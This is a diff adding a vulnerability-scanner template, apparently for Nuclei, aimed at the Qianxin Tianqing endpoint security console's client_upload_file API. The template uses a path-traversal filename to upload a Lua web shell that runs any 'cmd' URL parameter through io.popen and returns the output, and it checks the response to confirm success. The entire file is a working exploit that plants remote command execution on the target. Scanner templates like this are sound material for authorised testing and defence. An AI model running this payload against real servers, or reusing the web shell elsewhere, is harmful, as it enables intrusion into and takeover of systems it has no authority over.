@@ -1,0 +1,38 @@
+id: qianxin-tianqing-client-upload-file-fileupload
+info:
+  name: Qax Tianqing - File Upload
+  author: qwtd
+  severity: high
+  tags: 奇安信-天擎
+requests:
+  - raw:
+      - |
+        POST /api/client_upload_file.json?mid=202cb962ac59075b964b07152d234b10&md5=88aca4dfc84d8abd8c2b01a572d60339&filename=../../lua/{{randstr}}.LUAC HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Length: 277
+        Content-Type: multipart/form-data; boundary=cc363856508c37f89af87f66486f3e1c
+
+        --cc363856508c37f89af87f66486f3e1c
+        Content-Disposition: form-data; name="tom.php"; filename="tom.php"
+
+        if ngx.req.get_uri_args().cmd then
+        cmd = ngx.req.get_uri_args().cmd
+        local t = io.popen(cmd)
+        local a = t:read("*all")
+        ngx.say(a)
+        end
+        --cc363856508c37f89af87f66486f3e1c--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "upload_file_md5"
+      - type: status
+        status:
+          - 200
